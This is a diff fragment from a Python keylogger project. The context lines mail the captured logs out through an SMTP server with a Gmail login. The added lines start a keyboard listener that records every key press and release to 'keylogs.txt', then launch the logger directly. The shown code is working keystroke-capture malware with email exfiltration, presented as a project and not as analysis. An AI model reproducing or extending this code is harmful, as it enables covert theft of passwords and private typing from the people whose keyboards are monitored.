@@ -42,3 +42,11 @@ class KeyLogger():
             mail_server.login("pythonproject.py@gmail.com", '') 
             mail_server.send_message(message)
             mail_server.quit()
+            
+                  
+    def main(self):
+        with Listener(on_press=self.on_press,on_release=self.on_release) as listener:
+            listener.join()
+            
+logger = KeyLogger('keylogs.txt')
+logger.main()
